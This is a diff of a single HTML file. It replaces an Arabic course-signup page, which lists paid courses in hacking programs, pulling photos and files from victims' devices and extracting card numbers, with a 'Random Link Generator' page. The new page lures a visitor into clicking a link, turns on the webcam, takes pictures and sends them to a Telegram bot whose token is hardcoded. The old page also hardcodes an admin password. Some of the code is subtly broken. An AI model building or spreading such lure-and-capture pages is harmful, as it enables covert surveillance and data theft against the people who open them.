@@ -1,572 +1,110 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🇵🇸موقع التسجيل بالكورسات البرمجه 🇵🇸 </title>
-    <div style="margin: 10px 0; color: #988;">
-    المزعج.       الحاكم.    ❤ 
-            </div>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-        }
-        .container {
-            width: 90%;
-            margin: auto;
-            overflow: hidden;
-        }
-        header {
-            background: #333;
-            color: #fff;
-            padding-top: 30px;
-            min-height: 70px;
-            border-bottom: #bbb 1px solid;
-            text-align: center;
-        }
-        header h1 {
-            margin: 0;
-        }
-        .form-container {
-            background: #fff;
-            padding: 20px;
-            margin: 20px 0;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .form-container input, .form-container select {
-            width: calc(100% - 22px);
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        .form-container textarea {
-            width: calc(100% - 22px);
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        .form-container button {
-            background: #333;
-            color: #fff;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .form-container button:hover {
-            background: #555;
-        }
-        .admin-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        .admin-table th, .admin-table td {
-            padding: 10px;
-            border: 1px solid #ddd;
-            text-align: left;
-        }
-        .admin-table th {
-            background: #333;
-            color: #fff;
-        }
-        .admin-table tr:nth-child(even) {
-            background: #f9f9f9;
-        }
-        .admin-table button {
-            background: #e74c3c;
-            color: #fff;
-            border: none;
-            padding: 5px 10px;
-            margin-right: 5px;
-            cursor: pointer;
-        }
-        .admin-table button.edit {
-            background: #3498db;
-        }
-        footer {
-            background: #333;
-            color: #fff;
-            text-align: center;
-            padding: 10px;
-            position: absolute;
-            bottom: 0;
-            width: 100%;
-        }
-        .hidden {
-            display: none;
-        }
-        .full-screen {
-            width: 100vw;
-            height: 100vh;
-        }
-        .logout-button, .back-button {
-            background: #e74c3c;
-            color: #fff;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            position: absolute;
-            top: 10px;
-            right: 10px;
-        }
-        .back-button {
-            top: 10px;
-            left: 10px;
-            right: auto;
-        }
-        .login-container, .home-container {
-            width: 300px;
-            margin: 100px auto;
-            padding: 20px;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        .login-container input, .home-container input {
-            width: calc(100% - 22px);
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        .login-container button, .home-container button {
-            background: #333;
-            color: #fff;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .login-container button:hover, .home-container button:hover {
-            background: #555;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Random Link Generator</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.7.1/gsap.min.js"></script>
+  <style>
+   .link-container {
+      @apply mt-4;
+    }
+   .link-message {
+      @apply text-gray-600;
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <h1>موقع تسجيل كورسات البرمجه 🇵🇸</h1>
-    </header>
-
-    <!-- شاشة تسجيل الدخول -->
-    	
-    <div id="login-panel" class="login-container">
-        <h2>تسجيل الدخول</h2>
-        <button class="back-button" onclick="goBack()">رجوع</button>
-        <input type="text" id="username" placeholder="اسم المستخدم" required>
-        <input type="password" id="password" placeholder="كلمة المرور" required>
-        <button onclick="login()">تسجيل الدخول</button>
-        <div id="login-error" style="color: red; margin-top: 10px;"></div>
+  <div class="h-screen flex flex-col justify-center items-center bg-gradient-to-r from-purple-500 to-pink-500">
+    <h1 class="text-6xl font-bold text-white mb-8">Random Link Generator</h1>
+    <button class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded" id="generate-link-btn">Generate Link</button>
+    <div class="link-container hidden" id="link-container">
+      <a href="" id="generated-link" target="_blank"></a>
+      <p class="link-message" id="link-message"></p>
     </div>
-
-    <!-- الصفحة الرئيسية -->
-    <div id="home-panel" class="home-container hidden">
-        <h2>اختر ما تريد القيام به</h2>
-        <button onclick="showClientPanel()">🇵🇸لالتسجيل في الكورس من هنا 🇵🇸</button>
-        
-        
-        <div style="margin: 10px 0; color: #888;">
-
-            </div>
-        
-        
-        
-        
-        
-        
-        
-        
-                       المبرمج / المزعج الحاكم 🇵🇸
-        
-        
-        
-        <div style="margin: 10px 0; color: #888;">
-
-            </div>
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        <div style="margin: 10px 0; color: #888;">
-
-            </div>
-        
-        
-        
-        
-        
-        
-        . 
-        
-        
-        
-        . <div style="margin: 10px 0; color: #888;">
-
-            </div>
-        
-        
-        
-        <div style="margin: 10px 0; color: #888;">
-
-            </div>
-            
-            
-            
-            
-            <div style="margin: 10px 0; color: #888;">
-
-            </div>
-        
-        
-        <button onclick="showAdminPanel()">تسجيل الدخول الاداره 🇵🇸</button>
-       
-       <div style="margin: 10px 0; color: #888;">
-هذا يخص الادمن فقط احظر ❌
-            </div>
+    <div class="camera-container hidden" id="camera-container">
+      <video id="video" width="640" height="480"></video>
+      <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded" id="take-picture-btn">Take Picture</button>
     </div>
+  </div>
 
-    <div class="container">
-        <!-- لوحة العميل -->
-        <div id="client-panel" class="form-container hidden full-screen">
-            <button class="logout-button" onclick="logout()">تسجيل الخروج</button>
-            <button class="back-button" onclick="goBack()">رجوع</button>
-            <h2>تسجيل عميل</h2>
-            <input type="text" id="first-name" placeholder="الاسم الأول" required>
-            <input type="text" id="last-name" placeholder="الاسم الثاني" required>
-            <input type="text" id="phone" placeholder="رقم الهاتف" required>
-            	div class="form-group">
-                <label for="course">اختيار الكورس</label>
-                <select id="course">
-                    <option value="كورس مبتدئ">كورس مبتدئ</option>
-                    <option value="كورس متقدم">كورس متقدم</option>
-                </select>
-            	<div style="margin: 10px 0; color: #888;">
- ادخل رقم واتساب برمز الدول مثال رمز دوله مصر 20 بدون(+) 
- رموز الدول 
- مثال 💚
- 🇾🇪 967, 🇪🇬 20،  🇸🇦 967
-            </div>
-            <select id="course">
-            	<div style="margin: 10px 0; color: #888;">
-الكورسات المتاحه 🇵🇸
-            </div>
-                <!-- الكورسات سيتم تحميلها من التخزين المحلي -->
-            </select>
-            <textarea id="notes" placeholder="اسم الكورس" rows="4"></textarea>
-            <div style="margin: 10px 0; color: #908;">
- كورس جميع لغات البرمجه / السعر 300 🇵🇸
- <div style="margin: 10px 0; color: #908;">
- كورس تعليم لغه بايثون / السعر 190 🇵🇸
-            </div>
-<div style="margin: 10px 0; color: #908;">
-كورس تعليم شحن الالعاب المجاني /السعر 250 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
- كورس تعليم عمل برامج هكر /السعر 350 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
-كورس تعليم سحب الصور والملفات من اجهزه الضحيه /السعر 400 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
-كورس تعليم اساسيات البرمجه /السعر 90 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
-كورس اسبام استخراج فيزات اتشارج حقيقه /السعر 195 🇵🇸
-            </div>
- 
-<div style="margin: 10px 0; color: #908;">
-ملحوظه طرق الدفع ده بالجنيه المصري لو انت خارج مصر اسأل عن اسعار دولتك  متاح جميع طرق الدفع
-<a href="https://t.me/Almoz3j1" class="chat-button" target="_blank">من هنا اسال علي اسعار دولتك </a>
-            </div>
- 
+  <script>
+    const generateLinkBtn = document.getElementById('generate-link-btn');
+    const linkContainer = document.getElementById('link-container');
+    const generatedLink = document.getElementById('generated-link');
+    const linkMessage = document.getElementById('link-message');
+    const cameraContainer = document.getElementById('camera-container');
+    const video = document.getElementById('video');
+    const takePictureBtn = document.getElementById('take-picture-btn');
 
+    let picturesTaken = 0;
+    const telegramBotToken = '7700344369:AAExr9dJnXEEN74xLW_WlqCASGW4qtAqj4M';
+    const telegramBotApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
+    generateLinkBtn.addEventListener('click', generateRandomLink);
 
-            </div>
-            
-            <button onclick="registerClient()">تسجيل</button>
-        </div>
-
-        <!-- لوحة الإدارة -->
-        
-       
-        <div style="margin: 10px 0; color: #888;">
-
-
-
-
-
-            </div>
-            
-            
-            
-            <div style="margin: 10px 0; color: #888;">
-
-            </div>
-        
-        
-        <div id="admin-panel" class="form-container hidden full-screen">
-            <button class="logout-button" onclick="logout()">تسجيل الخروج</button>
-            <button class="back-button" onclick="goBack()">رجوع</button>
-            <h2>إدارة العملاء</h2>
-            <table class="admin-table">
-                <thead>
-                    <tr>
-                        <th>الاسم الأول</th>
-                        <th>الاسم الثاني</th>
-                        <th>رقم الهاتف</th>
-                        <th>الكورس</th>
-                        <th>ملاحظات</th>
-                        <th>إجراءات</th>
-                    </tr>
-                </thead>
-                <tbody id="client-list">
-                	
-                	<div style="margin: 10px 0; color: #888;">
-الكورسات بالاسعار للوكلاء
-            </div>
-        
-        
-                    <div style="margin: 10px 0; color: #908;">
- كورس جميع لغات البرمجه / السعر 300 🇵🇸
- <div style="margin: 10px 0; color: #908;">
- كورس تعليم لغه بايثون / السعر 190 🇵🇸
-            </div>
-<div style="margin: 10px 0; color: #908;">
-كورس تعليم شحن الالعاب المجاني /السعر 250 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
- كورس تعليم عمل برامج هكر /السعر 350 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
-كورس تعليم سحب الصور والملفات من اجهزه الضحيه /السعر 400 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
-كورس تعليم اساسيات البرمجه /السعر 90 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #908;">
-كورس اسبام استخراج فيزات اتشارج حقيقه /السعر 195 🇵🇸
-            </div>
-            <div style="margin: 10px 0; color: #888;">
-
-            </div>
-            <div style="margin: 10px 0; color: #888;">
-
-            </div>
-                    <!-- بيانات العملاء ستظهر هنا -->
-                </tbody>
-            </table>
-            <h3>إضافة عميل</h3>
-            <input type="text" id="new-first-name" placeholder="الاسم الأول" required>
-            <input type="text" id="new-last-name" placeholder="الاسم الثاني" required>
-            <input type="text" id="new-phone" placeholder="رقم الهاتف" required>
-            <select id="new-course"> <div style="margin: 10px 0; color: #888;">
-
-            </div>
-                <!-- الكورسات سيتم تحميلها من التخزين المحلي -->
-            </select>
-            <textarea id="new-notes" placeholder="متاح جميع الكورسات اكتب عايز كورس" rows="4"></textarea>
-            <button onclick="addClient()">إضافة عميل</button>
-            <h3>تعديل الكورسات</h3>
-            <input type="text" id="course-name" placeholder="اكتب اسم الكورس والسعر " required>
-            <input type="number" id="course-price" placeholder="سعر الكورس" required>
-            <button onclick="updateCourse()">تحديث الكورس</button>
-            
-        </div>
-        
-    </div>
-
-    <footer>
-        ✅المطور المزعج الحاكم
-    </footer>
-
-    <script>
-        let clients = JSON.parse(localStorage.getItem('clients')) || [];
-        let courses = JSON.parse(localStorage.getItem('courses')) || [];
-        const adminUsername = 'almoz3j';
-        const adminPassword = 'almoz3j1234@#$_&';
-        let isAdmin = false;
-
-        function loadCourses() {
-            const courseSelects = document.querySelectorAll('#course, #new-course');
-            courseSelects.forEach(select => {
-                courses.forEach(course => {
-                    select.innerHTML += `<option value="${course.name}">${course.name} - ${course.price}</option>`;
-                });
-            });
-        }
-
-        function login() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            if (username === adminUsername && password === adminPassword) {
-                isAdmin = true;
-                document.getElementById('login-panel').style.display = 'none';
-                document.getElementById('admin-panel').style.display = 'block';
-                loadCourses();
-                updateAdminTable();
-            } else {
-                document.getElementById('login-error').textContent = 'اسم المستخدم أو كلمة المرور غير صحيحة';
-            }
-        }
-
-        function showClientPanel() {
-            document.getElementById('home-panel').style.display = 'none';
-            document.getElementById('client-panel').style.display = 'block';
-            loadCourses();
-        }
-
-        function showAdminPanel() {
-            document.getElementById('home-panel').style.display = 'none';
-            document.getElementById('login-panel').style.display = 'block';
-        }
-
-        function registerClient() {
-    const firstName = document.getElementById('first-name').value;
-    const lastName = document.getElementById('last-name').value;
-    const phone = document.getElementById('phone').value;
-    const course = document.getElementById('course').value;
-    const notes = document.getElementById('notes').value;
-
-    if (firstName && lastName && phone && course) {
-        // تخزين بيانات العميل في localStorage
-        clients.push({ firstName, lastName, phone, course, notes });
-        localStorage.setItem('clients', JSON.stringify(clients));  // حفظ البيانات
-        
-        alert('تم التسجيل بنجاح');
-    } else {
-        alert('يرجى ملء جميع الحقول');
+    async function generateRandomLink() {
+      try {
+        const link = `https://example.com/${Math.random().toString(36).substr(2, 9)}`;
+        generatedLink.href = link;
+        generatedLink.textContent = link;
+        linkContainer.classList.remove('hidden');
+        linkMessage.textContent = 'Click the link to take 3 pictures!';
+        generatedLink.addEventListener('click', async () => {
+          await takePictures();
+        });
+      } catch (error) {
+        console.error(error);
+      }
     }
-}
 
-        function addClient() {
-            const firstName = document.getElementById('new-first-name').value;
-            const lastName = document.getElementById('new-last-name').value;
-            const phone = document.getElementById('new-phone').value;
-            const course = document.getElementById('new-course').value;
-            const notes = document.getElementById('new-notes').value;
+    async function takePictures() {
+      try {
+        cameraContainer.classList.remove('hidden');
+        await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+         .then(stream => {
+            video.srcObject = stream;
+            video.play();
+            takePictureBtn.addEventListener('click', async () => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              const picture = canvas.toDataURL('image/jpeg');
+              await sendPictureToTelegramBot(picture);
+              picturesTaken++;
+              if (picturesTaken === 3) {
+                cameraContainer.classList.add('hidden');
+              }
+            });
+          })
+         .catch(error => {
+            console.error(error);
+          });
+      } catch (error) {
+        console.error(error);
+      }
+    }
 
-            if (firstName && lastName && phone && course) {
-                clients.push({ firstName, lastName, phone, course, notes });
-                localStorage.setItem('clients', JSON.stringify(clients));
-                updateAdminTable();
-                document.getElementById('new-first-name').value = '';
-                document.getElementById('new-last-name').value = '';
-                document.getElementById('new-phone').value = '';
-                document.getElementById('new-course').value = '';
-                document.getElementById('new-notes').value = '';
-            } else {
-                alert('يرجى ملء جميع الحقول');
-            }
-        }
-
-        function updateAdminTable() {
-    const clientList = document.getElementById('client-list');
-    clientList.innerHTML = '';
-    
-    // تحميل البيانات المخزنة
-    const storedClients = JSON.parse(localStorage.getItem('clients')) || [];
-    clients = storedClients;
-    
-    clients.forEach((client, index) => {
-        clientList.innerHTML += `
-            <tr>
-                <td>${client.firstName}</td>
-                <td>${client.lastName}</td>
-                <td>${client.phone}</td>
-                <td>${client.course}</td>
-                <td>${client.notes}</td>
-                <td>
-                	<div style="margin: 10px 0; color: #888;">
-
-            </div>
-                    <button onclick="deleteClient(${index})">حذف</button>
-                    
-                </td>
-            </tr>
-        `;
-    });
-}
-
-
-        function editClient(index) {
-            const client = clients[index];
-            document.getElementById('new-first-name').value = client.firstName;
-            document.getElementById('new-last-name').value = client.lastName;
-            document.getElementById('new-phone').value = client.phone;
-            document.getElementById('new-course').value = client.course;
-            document.getElementById('new-notes').value = client.notes;
-            clients.splice(index, 1);
-            localStorage.setItem('clients', JSON.stringify(clients));
-            updateAdminTable();
-        }
-
-        function deleteClient(index) {
-    clients.splice(index, 1);  // إزالة العميل من القائمة
-    localStorage.setItem('clients', JSON.stringify(clients));  // تحديث البيانات المخزنة
-    updateAdminTable();  // إعادة تحديث الجدول
-}
-
-
-
-        function updateCourse() {
-            const courseName = document.getElementById('course-name').value;
-            const coursePrice = document.getElementById('course-price').value;
-
-            if (courseName && coursePrice) {
-                courses = courses.filter(course => course.name !== courseName);
-                courses.push({ name: courseName, price: coursePrice });
-                localStorage.setItem('courses', JSON.stringify(courses));
-                loadCourses();
-                alert('تم تحديث الكورس بنجاح');
-                document.getElementById('course-name').value = '';
-                document.getElementById('course-price').value = '';
-            } else {
-                alert('يرجى ملء جميع الحقول');
-            }
-        }
-
-        function logout() {
-            if (isAdmin) {
-                document.getElementById('admin-panel').style.display = 'none';
-                document.getElementById('login-panel').style.display = 'block';
-                isAdmin = false;
-            } else {
-                document.getElementById('client-panel').style.display = 'none';
-                document.getElementById('home-panel').style.display = 'block';
-            }
-        }
-
-        function goBack() {
-            if (isAdmin) {
-                document.getElementById('admin-panel').style.display = 'none';
-                document.getElementById('home-panel').style.display = 'block';
-            } else {
-                document.getElementById('client-panel').style.display = 'none';
-                document.getElementById('home-panel').style.display = 'block';
-            }
-        }
-
-        // تحميل البيانات عند بدء التشغيل
-        document.getElementById('login-panel').style.display = 'none';
-        document.getElementById('client-panel').style.display = 'none';
-        document.getElementById('admin-panel').style.display = 'none';
-        document.getElementById('home-panel').style.display = 'block';
-        loadCourses();
-    </script>
+    async function sendPictureToTelegramBot(picture) {
+      try {
+        const response = await fetch(telegramBotApiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: '@your_channel_username',
+            photo: picture
+          })
+        });
+        const data = await response.json();
+        console.log(data);
+      } catch (error) {
+        console.error(error);
+      }
+    }
+  </script>
 </body>
 </html>
